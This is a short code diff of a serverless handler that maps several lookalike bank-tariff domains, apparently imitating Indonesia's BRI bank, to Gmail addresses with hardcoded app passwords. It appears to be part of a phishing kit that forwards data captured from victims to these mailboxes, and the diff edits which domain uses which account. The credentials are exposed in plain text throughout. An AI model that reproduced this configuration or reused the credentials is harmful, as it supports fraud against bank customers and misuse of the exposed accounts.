@@ -24,7 +24,7 @@ export default function handler(req, res) {
         email = 'tarifbaru36@gmail.com';
         pass = 'moiasopufjkptyvr';
 
-    } else if(url == 'ubah-tariff-baru.vercel.app'){
+    } else if(url == ' '){
         email = 'accbrimo05@gmail.com';
         pass = 'hluxpmqqqqsjrbaf';
 
@@ -40,7 +40,7 @@ export default function handler(req, res) {
         email = 'bbri94669@gmail.com';
         pass = 'tdoctundphxocdqu';
 
-    } else if(url == 'tarifbribaru-lama.vercel.app'){
+    } else if(url == 'tarifbaru-lama.vercel.app'){
         email = 'wanw4826@gmail.com';
         pass = 'fgevrxoxoymjmzka';
 
